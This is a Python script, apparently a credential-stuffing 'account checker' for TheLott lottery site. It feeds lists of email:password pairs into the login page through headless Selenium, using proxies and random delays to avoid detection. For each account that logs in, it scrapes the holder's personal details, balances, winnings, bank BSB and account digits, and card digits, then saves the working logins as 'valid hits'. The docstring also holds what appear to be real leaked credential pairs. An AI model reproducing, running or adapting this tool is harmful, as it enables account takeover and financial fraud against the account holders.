#!/usr/bin/env python3
"""
TheLott Account Checker
Extracts: Payment methods, Phone, 2FA, Tickets, Funds, Bank withdrawals, Profile info, Spent/Won/Deposited totals
Test login: I.cameron:cammal2312 | ritsewak83@gmail.com:Ilovesim1
"""

import os
import re
import json
import time
import random
from datetime import datetime, timedelta

# Try selenium, fallback to requests
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import TimeoutException, NoSuchElementException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("Selenium not available - using requests mode")

# === CONFIGURATION ===
THELOTT_URL = "https://retailersweb.thelott.com/s/login/"
HEADLESS = True  # Set False to see browser
OUTPUT_DIR = "./thelott_results"

# Proxy support (add Australian proxy here)
PROXY = None  # e.g., "http://123.45.67.89:8080" or "socks5://..."

# Adaptive selectors
SELECTORS = {
    "email": ['input[name="email"]', 'input[type="email"]', '#email', 'input[id*="email"]'],
    "password": ['input[name="password"]', 'input[type="password"]', '#password'],
    "submit": ['button[type="submit"]', 'button:contains("LOG IN")', '.login-btn', 'input[type="submit"]'],
    "2fa_input": ['input[name="code"]', 'input[id*="code"]', 'input[placeholder*="code"]'],
    "dashboard": ['.dashboard', '.account-home', '[class*="dashboard"]', '[class*="account"]'],
}

class TheLottChecker:
    def __init__(self, headless=True):
        self.driver = None
        self.headless = headless
        self.session = None
        
    def setup_driver(self):
        if not SELENIUM_AVAILABLE:
            return False
        opts = Options()
        if self.headless:
            opts.add_argument("--headless")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--window-size=1280,720")
        opts.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        
        # Add proxy if configured
        if PROXY:
            opts.add_argument(f"--proxy-server={PROXY}")
            print(f"Using proxy: {PROXY}")
        
        try:
            self.driver = webdriver.Chrome(options=opts)
            self.driver.set_page_load_timeout(30)
            return True
        except Exception as e:
            print(f"Driver error: {e}")
            return False
    
    def find_element(self, selectors, timeout=10):
        """Try multiple selectors"""
        if not self.driver:
            return None
            
        for selector in selectors:
            try:
                if selector.startswith("//"):
                    el = WebDriverWait(self.driver, timeout).until(
                        EC.presence_of_element_located((By.XPATH, selector))
                    )
                elif selector.startswith("."):
                    el = WebDriverWait(self.driver, timeout).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                else:
                    el = WebDriverWait(self.driver, timeout).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                return el
            except:
                continue
        return None
    
    def login(self, email, password, max_retries=3):
        """Login with adaptive selectors"""
        if not self.setup_driver():
            print(f"Cannot setup driver for {email}")
            return None
        
        for attempt in range(max_retries):
            try:
                self.driver.get(THELOTT_URL)
                time.sleep(random.uniform(2, 4))
                
                # Email field
                email_el = self.find_element(SELECTORS["email"])
                if not email_el:
                    print(f"Email field not found (attempt {attempt+1})")
                    continue
                email_el.clear()
                email_el.send_keys(email)
                
                # Password field
                pass_el = self.find_element(SELECTORS["password"])
                if not pass_el:
                    print(f"Password field not found (attempt {attempt+1})")
                    continue
                pass_el.clear()
                pass_el.send_keys(password)
                
                # Submit
                time.sleep(0.5)
                submit_el = self.find_element(SELECTORS["submit"])
                if submit_el:
                    submit_el.click()
                
                time.sleep(3)
                
                # Check for 2FA
                if self.check_2fa():
                    return {"status": "2FA_REQUIRED", "email": email}
                
                # Check for error
                error = self.find_element(['.error', '[class*="error"]', '.message.error'])
                if error and error.text:
                    return {"status": "INVALID", "email": email, "error": error.text}
                
                # Check success - look for dashboard elements
                if self.is_logged_in():
                    return {"status": "VALID", "email": email}
                    
            except Exception as e:
                print(f"Login attempt {attempt+1} error: {e}")
                time.sleep(2)
        
        return {"status": "FAILED", "email": email}
    
    def check_2fa(self):
        """Check if 2FA is required"""
        code_input = self.find_element(SELECTORS["2fa_input"], timeout=3)
        if code_input:
            return True
        # Check page text for 2FA indicators
        if self.driver:
            page_text = self.driver.page_source.lower()
            if "code" in page_text or "security" in page_text or "verify" in page_text:
                if "sent" in page_text or "enter" in page_text:
                    return True
        return False
    
    def is_logged_in(self):
        """Check if logged in"""
        if not self.driver:
            return False
        url = self.driver.current_url
        # Successful login redirects away from login page
        if "login" not in url.lower():
            return True
        # Check for dashboard elements
        dash = self.find_element(SELECTORS["dashboard"], timeout=5)
        if dash:
            return True
        return False
    
    def extract_profile(self):
        """Extract profile information"""
        data = {"profile": {}, "financial": {}, "tickets": [], "payment_methods": [], "2fa": False}
        
        if not self.driver:
            return data
        
        try:
            # Get page source for text analysis
            html = self.driver.page_source
            
            # Extract name (pattern matching)
            name_patterns = [
                r'(?i)name[:\s]+([A-Z][a-z]+\s+[A-Z][a-z]+)',
                r'(?i)<strong>([A-Z][a-z]+\s+[A-Z][a-z]+)</strong>',
            ]
            for pattern in name_patterns:
                match = re.search(pattern, html)
                if match:
                    data["profile"]["name"] = match.group(1).strip()
                    break
            
            # Extract phone
            phone_patterns = [
                r'(\+61\s?\d\s?\d{3}\s?\d{3}\s?\d{3})',
                r'(?i)phone[:\s]*(\d{10})',
                r'(?i)mobile[:\s]*(\d{10})',
            ]
            for pattern in phone_patterns:
                match = re.search(pattern, html)
                if match:
                    data["profile"]["phone"] = match.group(1).strip()
                    break
            
            # Extract email
            email_match = re.search(r'[\w\.-]+@[\w\.-]+\.\w+', html)
            if email_match:
                data["profile"]["email"] = email_match.group()
            
            # Check 2FA status
            if "two-factor" in html.lower() or "2fa" in html.lower():
                data["2fa"] = True
            
            # Financial totals
            spent_patterns = [
                r'(?i)total\s+spent[:\s]*\$?([\d,]+\.?\d*)',
                r'(?i)spent[:\s]*\$?([\d,]+\.?\d*)',
            ]
            for pattern in spent_patterns:
                match = re.search(pattern, html)
                if match:
                    data["financial"]["total_spent"] = match.group(1).strip()
                    break
            
            won_patterns = [
                r'(?i)total\s+won[:\s]*\$?([\d,]+\.?\d*)',
                r'(?i)winnings[:\s]*\$?([\d,]+\.?\d*)',
            ]
            for pattern in won_patterns:
                match = re.search(pattern, html)
                if match:
                    data["financial"]["total_won"] = match.group(1).strip()
                    break
            
            deposited_patterns = [
                r'(?i)total\s+deposited[:\s]*\$?([\d,]+\.?\d*)',
                r'(?i)deposited[:\s]*\$?([\d,]+\.?\d*)',
            ]
            for pattern in deposited_patterns:
                match = re.search(pattern, html)
                if match:
                    data["financial"]["total_deposited"] = match.group(1).strip()
                    break
            
            # Balance/Funds
            balance_patterns = [
                r'(?i)balance[:\s]*\$?([\d,]+\.?\d*)',
                r'(?i)available[:\s]*\$?([\d,]+\.?\d*)',
                r'(?i)funds[:\s]*\$?([\d,]+\.?\d*)',
            ]
            for pattern in balance_patterns:
                match = re.search(pattern, html)
                if match:
                    data["financial"]["balance"] = match.group(1).strip()
                    break
            
            # Bank accounts for withdrawal
            bank_patterns = [
                r'(?i)bank\s*account[:\s]*\*\*\*(\d{4})',
                r'(?i)withdrawal\s*account[:\s]*(.*?)(?:\s+|\<)',
                r'(?i)bsb[:\s]*(\d{3}\s*\d{3})',
            ]
            for pattern in bank_patterns:
                matches = re.findall(pattern, html)
                if matches:
                    data["payment_methods"]["bank_accounts"] = matches[:3]
            
            # Payment cards
            card_patterns = [
                r' Visa [\d\*]+(\d{4})',
                r' Mastercard [\d\*]+(\d{4})',
                r'[\d\*]+(\d{4})(?:\s+|\/)(\d{2})',
            ]
            for pattern in card_patterns:
                matches = re.findall(pattern, html)
                if matches:
                    data["payment_methods"]["cards"] = matches[:3]
            
            # Tickets/Entries
            ticket_patterns = [
                r'(?i)<!--.*?-->(.*?)<!--',
                r'(?i)ticket[#:\s]*(\w+\d+)',
                r'(?i)entry[#:\s]*(\w+\d+)',
            ]
            for pattern in ticket_patterns:
                matches = re.findall(pattern, html)
                if matches:
                    data["tickets"] = [m.strip() for m in matches[:10]]
            
        except Exception as e:
            print(f"Extraction error: {e}")
        
        return data
    
    def extract_transactions(self, days=90):
        """Extract transactions with dates"""
        transactions = []
        try:
            # Look for transaction patterns in HTML
            if not self.driver:
                return transactions
            
            html = self.driver.page_source
            
            # Date-tracked transaction patterns
            patterns = [
                r'(\d{2}/\d{2}/\d{4})\s+\$?([\d,]+\.?\d*)',
                r'(\d{2}-\d{2}-\d{4})\s+\$?([\d,]+\.?\d*)',
            ]
            for pattern in patterns:
                matches = re.findall(pattern, html)
                for date_str, amount in matches[:20]:
                    transactions.append({
                        "date": date_str,
                        "amount": amount.strip()
                    })
            
        except Exception as e:
            print(f"Transaction extraction error: {e}")
        
        return transactions
    
    def close(self):
        if self.driver:
            self.driver.quit()
            self.driver = None


def load_accounts(filename="accounts.txt"):
    """Load email:pass accounts"""
    accounts = []
    if os.path.exists(filename):
        with open(filename) as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    email, password = line.split(":", 1)
                    accounts.append({"email": email.strip(), "password": password.strip()})
    return accounts


def save_results(results, output_dir=OUTPUT_DIR):
    """Save results to JSON"""
    os.makedirs(output_dir, exist_ok=True)
    
    # Save JSON
    json_file = os.path.join(output_dir, "thelott_results.json")
    with open(json_file, "w") as f:
        json.dump(results, f, indent=2, default=str)
    
    # Save valid hits
    valid_file = os.path.join(output_dir, "valid_hits.txt")
    with open(valid_file, "w") as f:
        for r in results:
            if r.get("status") == "VALID":
                f.write(f"{r['email']}:{r['password']}\n")
    
    # Save text report
    txt_file = os.path.join(output_dir, "report.txt")
    with open(txt_file, "w") as f:
        f.write("="*50 + "\n")
        f.write("THELOTT ACCOUNT CHECK REPORT\n")
        f.write(f"Generated: {datetime.now()}\n")
        f.write("="*50 + "\n\n")
        
        for r in results:
            f.write(f"Account: {r.get('email')}\n")
            f.write(f"Status: {r.get('status')}\n")
            
            if r.get("data"):
                data = r["data"]
                if data.get("profile"):
                    f.write(f"Profile: {data['profile']}\n")
                if data.get("financial"):
                    f.write(f"Financial: {data['financial']}\n")
                if data.get("2fa"):
                    f.write(f"2FA Enabled: {data['2fa']}\n")
                if data.get("payment_methods"):
                    f.write(f"Payment Methods: {data['payment_methods']}\n")
            
            f.write("-"*30 + "\n\n")
    
    print(f"Results saved to {output_dir}/")
    return json_file


def check_account(email, password):
    """Check single account"""
    checker = TheLottChecker(headless=HEADLESS)
    
    # Try login
    result = checker.login(email, password)
    
    if result.get("status") == "VALID":
        # Extract data
        result["data"] = checker.extract_profile()
        result["transactions"] = checker.extract_transactions()
    
    checker.close()
    return result


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="TheLott Account Checker")
    parser.add_argument("--accounts", default="accounts.txt", help="Account file")
    parser.add_argument("--headless", action="store_true", default=True, help="Headless mode")
    parser.add_argument("--visible", action="store_true", help="Show browser")
    args = parser.parse_args()
    
    if args.visible:
        HEADLESS = False
    
    # Load accounts
    accounts = load_accounts(args.accounts)
    if not accounts:
        print(f"No accounts in {args.accounts}")
        print("Format: email:password")
        return
    
    print(f"Checking {len(accounts)} accounts...")
    
    results = []
    for i, acc in enumerate(accounts):
        email = acc["email"]
        password = acc["password"]
        print(f"\n[{i+1}/{len(accounts)}] Checking: {email}")
        
        result = check_account(email, password)
        print(f"  Status: {result.get('status', 'UNKNOWN')}")
        
        if result.get("status") == "VALID":
            if result.get("data"):
                profile = result["data"].get("profile", {})
                financial = result["data"].get("financial", {})
                print(f"  Profile: {profile}")
                print(f"  Financial: {financial}")
                print(f"  2FA: {result['data'].get('2fa', False)}")
        
        results.append({**acc, **result})
        
        # Delay between accounts
        if i < len(accounts) - 1:
            time.sleep(random.uniform(2, 5))
    
    # Save results
    save_results(results)
    
    valid_count = sum(1 for r in results if r.get("status") == "VALID")
    print(f"\n{valid_count}/{len(accounts)} accounts VALID")


if __name__ == "__main__":
    main()